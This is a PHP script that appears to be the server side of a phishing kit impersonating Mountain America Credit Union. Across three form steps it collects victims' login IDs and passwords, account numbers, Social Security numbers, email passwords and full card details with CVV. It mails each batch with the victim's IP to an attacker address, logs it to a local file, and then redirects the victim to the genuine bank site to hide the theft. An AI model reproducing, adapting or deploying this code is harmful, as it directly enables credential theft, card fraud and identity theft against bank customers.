<?php
session_start();
$send = "_mainaccount@wwwmacubank.x443.pw";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga=rand();
$praga=md5($praga);
$page= $_POST['page'];







if ($page == '1') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Macu log  | -----------\n";
$message .= "Id      :  ".$_POST['id']." \n";
$message .= "Pass    :  ".$_POST['pass']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";

$subject = "| Macu  By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./locked.php?code_verif-locked.aspx?Pedido=CodeOPASEvent=$praga-session_id=$praga$praga");
}


if ($page == '2') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Macu iNFOS  | -----------\n";
$message .= "Acc Num :  ".$_POST['num']." \n";
$message .= "SSN     :  ".$_POST['ssn']." \n";
$message .= "Email   :  ".$_POST['email']." \n";
$message .= "EPass   :  ".$_POST['epass']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";

$subject = "| Macu iNFOS By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./validate.php?code_verif-info.aspx?Pedido=CodeSMSEvent=$praga-session_id=$praga$praga");
}






if ($page == '3') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Macu CC  | -----------\n";
$message .= "Card    :  ".$_POST['card']." \n";
$message .= "Exp     :  ".$_POST['exp']." \n";
$message .= "Cvv     :  ".$_POST['cvv']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";

$subject = "| Macu CC  By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:https://o.macu.com/");
}










?>


